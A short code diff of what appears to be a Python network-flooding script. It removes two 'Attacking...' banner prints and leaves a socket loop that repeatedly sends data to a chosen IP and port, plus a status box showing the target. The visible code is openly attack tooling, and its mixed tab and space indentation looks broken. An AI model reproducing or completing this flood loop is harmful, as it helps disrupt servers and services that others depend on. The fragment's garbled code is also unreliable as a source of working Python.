@@ -59,8 +59,8 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			 print(Fore.LIGHTRED_EX+"Attacking...")
-    print(Fore.LIGHTWHITE_EX+"Dang Suc Cac Sever: ")
+			 
+    
     print("╔═════════════════")
     print(f"║ IP    : {ip}   ")
     print(f"║ Port  : {port} ")
@@ -69,8 +69,8 @@ def run2():
     print("╚═════════════════")
 		except:
 			s.close()
-			print(Fore.LIGHTRED_EX+"Attacking...")
-    print(Fore.LIGHTWHITE_EX+"Dang Suc Cac Sever: ")
+			
+    
     print("╔═════════════════")
     print(f"║ IP    : {ip}   ")
     print(f"║ Port  : {port} ")
